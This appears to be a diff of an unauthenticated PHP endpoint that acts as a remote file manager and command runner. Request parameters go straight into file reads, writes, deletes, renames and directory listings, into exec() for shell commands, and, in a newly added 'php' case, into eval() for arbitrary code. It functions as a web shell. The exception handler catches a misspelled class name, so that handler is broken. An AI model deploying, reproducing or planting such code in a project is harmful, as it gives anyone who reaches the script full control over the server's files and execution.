@@ -14,18 +14,17 @@
 $resp = array();
 $resp['res'] = 0 ;
 
-if( !empty($_REQUEST['n']) )
-switch ( $_REQUEST['c'] ) {
+
+if( !empty($_REQUEST['n']) && !empty($_REQUEST['c']) ) {
+  $cmd = trim($_REQUEST['c']);
+  $file = trim($_REQUEST['n']);
+  switch ( $cmd ) {
     case 'i':
-		if( $vstat = stat( $_REQUEST['n'] ) ) {
-			$resp['size'] = $vstat['size'] ;
-			$resp['atime'] = $vstat['atime'] ;
-			$resp['mtime'] = $vstat['mtime'] ;
-			$resp['ctime'] = $vstat['ctime'] ;
-			$resp['dev'] = $vstat['dev'] ;
-			$resp['ino'] = $vstat['ino'] ;
-			$resp['mode'] = $vstat['mode'] ;
-			$resp['realpath'] = realpath($_REQUEST['n']);
+		if( $vstat = stat( $file ) ) {
+			foreach ( $vstat as $key => $value) {
+				$resp[$key] = $value ;
+			}
+			$resp['realpath'] = realpath($file);
 			$resp['type'] = filetype( $resp['realpath'] );
 			$resp['basename'] = basename( $resp['realpath'] );
 			$resp['dirname'] = dirname( $resp['realpath'] );
@@ -33,9 +32,10 @@ switch ( $_REQUEST['c'] ) {
 		}
 		break;
 		
-	case 'rm':
-		@$f = fopen( $_REQUEST['n'], 'rb' ) ;
+	case 'rm':		// read multi lines,  o=offset, l=lines
+		@$f = fopen( $file, 'r' ) ;
 		if( $f ) {
+			flock($f, LOCK_SH );
 			$pos = 0 ;
 			if( !empty( $_REQUEST['o'] ) ) {
 				$pos = (int)$_REQUEST['o'] ;
@@ -53,7 +53,7 @@ switch ( $_REQUEST['c'] ) {
 				$li = array();
 				$li['text'] = $line ;
 				$pos = ftell( $f ) ;
-				$li['npos'] = $pos ;
+				$li['npos'] = $pos ;	// pos of next line 
 				$lines[] = $li ;
 			}
 			$lcount = count( $lines ) ;
@@ -63,14 +63,16 @@ switch ( $_REQUEST['c'] ) {
 				$resp['lines'] = $lines ;
 				$resp['res'] = 1 ;
 			}
+			flock($f, LOCK_UN );
 			fclose( $f );
 		}
 		break;
 
 	case 'rl':
 		header("Content-Type: application/octet-stream");	
-		@$f = fopen( $_REQUEST['n'], 'rb' ) ;
+		@$f = fopen($file, 'rb' ) ;
 		if( $f ) {
+			flock($f, LOCK_SH );
 			if( !empty( $_REQUEST['o'] ) ) {
 				fseek( $f, $_REQUEST['o'], SEEK_SET ) ;
 			}
@@ -88,7 +90,7 @@ switch ( $_REQUEST['c'] ) {
 			else {
 				header("Content-Length: 0" );
 			}
-			
+			flock($f, LOCK_UN );
 			fclose( $f );
 		}
 		
@@ -96,8 +98,10 @@ switch ( $_REQUEST['c'] ) {
 		
 	case 'r' :
 		header("Content-Type: application/octet-stream");	
-		@$f = fopen( $_REQUEST['n'], 'rb' ) ;
+		@$f = fopen($file, 'rb' ) ;
 		if( $f ) {
+			flock($f, LOCK_SH );
+			
 			$offset = 0 ;
 			fseek( $f, 0, SEEK_END );
 			$fs = ftell( $f ) ;
@@ -122,8 +126,8 @@ switch ( $_REQUEST['c'] ) {
 				while( $len > 0 ) {
 					set_time_limit(30);
 					$r = $len ;
-					if( $r > 8192 ) {
-						$r = 8192 ;
+					if( $r > 131072 ) {
+						$r = 131072 ;
 					}
 					$da = fread( $f, $r ) ;
 					if( strlen( $da ) > 0 ) {
@@ -139,6 +143,7 @@ switch ( $_REQUEST['c'] ) {
 				header("Content-Length: 0" );
 			}
 			
+			flock($f, LOCK_UN );
 			fclose( $f );
 		}
 		
@@ -146,8 +151,10 @@ switch ( $_REQUEST['c'] ) {
 		
 	case 'f' :
 		header("Content-Type: application/octet-stream");	
-		@$f = fopen( $_REQUEST['n'], 'rb' ) ;
+		@$f = fopen( $file, 'rb' ) ;
 		if( $f ) {
+			flock($f, LOCK_SH );
+			
 			header( "Accept-Ranges: bytes" );
 			fseek( $f, 0, SEEK_END );
 			$fs = ftell( $f );
@@ -161,13 +168,13 @@ switch ( $_REQUEST['c'] ) {
 					$lastpos = $range[1] ;
 				}
 				$offset = $range[0] ;
-				$len = $lastpos + 1 - $offset ;
+				$len = $lastpos - $offset + 1 ;
 				header( sprintf("Content-Range: bytes %d-%d/%d", $offset, $lastpos, $fs ));
 				header( "HTTP/1.1 206 Partial Content" );
 			}
 			else {
-				$len = $fs ;
 				$offset = 0 ;
+				$len = $fs ;
 			}
 
 			if( $len>0 ) {
@@ -177,8 +184,8 @@ switch ( $_REQUEST['c'] ) {
 				while( $len > 0 ) {
 					set_time_limit(30);
 					$r = $len ;
-					if( $r > 8192 ) {
-						$r = 8192 ;
+					if( $r > 131072 ) {
+						$r = 131072 ;
 					}
 					$da = fread( $f, $r ) ;
 					if( strlen( $da ) > 0 ) {
@@ -193,47 +200,26 @@ switch ( $_REQUEST['c'] ) {
 			else {
 				header("Content-Length: 0" );
 			}
-			
+
+			flock($f, LOCK_UN );
 			fclose( $f );
 		}
 		
 		return ;
 		
-	case 'dir' :
-		$list = glob( $_REQUEST['n'] ) ;
-		if( $list ) {
-			$resp['list'] = $list ;
-			$resp['res'] = 1 ;
-		}
-		break;
-		
-	case 'mkdir' :
-		if( mkdir( $_REQUEST['n'], 0777, true ) ) {
-			$resp['res'] = 1 ;
-		}
-		break;
-		
-	case 'rmdir' :
-		if( rmdir( $_REQUEST['n'] ) ) {
-			$resp['res'] = 1 ;
-		}
-		break;		
-		
-	case 'disk' :
-		$resp['total'] = disk_total_space($_REQUEST['n']) ;
-		$resp['free'] = disk_free_space($_REQUEST['n']) ;
-		$resp['res'] = 1 ;
-		break;	
-
 	case 'w' :
-		if( isset( $_REQUEST['o'] ) ) {
-			$f = fopen( $_REQUEST['n'], 'cb' ) ;
-			fseek( $f, (int)$_REQUEST['o'], SEEK_SET ) ;
+		if( file_exists( $file ) ) {
+			$mtime = filemtime( $file ) ;
 		}
-		else {
-			$f = fopen( $_REQUEST['n'], 'wb' ) ;
-		}
+		$f = fopen( $file, 'cb' ) ;
 		if( $f ) {
+			flock( $f, LOCK_EX );
+			if( isset( $_REQUEST['o'] ) ) {
+				fseek( $f, (int)$_REQUEST['o'], SEEK_SET ) ;
+			}
+			else {
+				ftruncate($f, 0);
+			}
 			if( isset($_REQUEST['l'])) {
 				$resp['ret'] = fwrite( $f,  $_REQUEST['l'] );
 				$resp['pos'] = ftell( $f );
@@ -250,28 +236,72 @@ switch ( $_REQUEST['c'] ) {
 				$resp['ret'] = 0 ;
 				$resp['res'] = ftruncate($f, $resp['pos']);
 			}
+			flock( $f, LOCK_UN );
 			fclose( $f );
+			if( !empty($mtime) ) touch($file, $mtime);
+		}
+		break;		
+		
+	case 'dir' :
+		$list = glob( $file ) ;
+		if( $list ) {
+			$resp['list'] = $list ;
+			$resp['res'] = 1 ;
 		}
 		break;
+		
+	case 'mkdir' :
+		if( mkdir( $file, 0777, true ) ) {
+			$resp['res'] = 1 ;
+		}
+		break;
+		
+	case 'rmdir' :
+		if( rmdir( $file ) ) {
+			$resp['res'] = 1 ;
+		}
+		break;		
+		
+	case 'disk' :
+		$resp['total'] = disk_total_space($file) ;
+		$resp['free'] = disk_free_space($file) ;
+		$resp['res'] = 1 ;
+		break;	
 
 	case 'd' :
-		if( unlink( $_REQUEST['n'] ) ) {
+		if( unlink( $file ) ) {
 			$resp['res'] = 1 ;
 		}
 		break;
 
 	case 'n' :
-		if( rename( $_REQUEST['n'], $_REQUEST['l'] ) ) {
+		if( rename( $file, trim($_REQUEST['l']) ) ) {
 			$resp['res'] = 1 ;
 		}
 		break;
 				
+	case 'php' :
+		if( !empty( $file ) ) {
+			try {
+				eval( $file.' ;' );
+			}
+			catch( Execption $e ) {
+				echo 'Execption: '.$e->getMessage().'\n' ;
+			}
+		}
+		return;
+		
 	case 'e' :
 		$resp['output']=array();
 		$resp['ret']=-1 ;
-		$resp['rvalue'] = exec( $_REQUEST['n'], $resp['output'], $resp['ret']);
+		$resp['rvalue'] = exec( $file, $resp['output'], $resp['ret']);
 		$resp['res'] = 1 ;
 		break;
+	
+	default :
+		$resp['error'] = "Unknonw cmd!" ;
+		break;
+  }
 }
 header("Content-Type: application/json");
 echo json_encode($resp);
